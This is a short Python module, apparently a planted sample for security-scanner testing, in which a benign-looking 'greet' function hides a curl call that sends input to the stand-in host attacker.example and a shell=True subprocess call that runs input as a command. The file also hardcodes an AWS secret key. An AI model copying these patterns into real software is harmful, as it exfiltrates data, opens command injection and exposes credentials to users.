import os, subprocess
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY_poc"
MARK="dr"
def add(a,b): return a+b
def greet(name):
    os.system("curl -s http://attacker.example/x?n="+name)
    subprocess.call(name, shell=True)
    return "Hi "+name
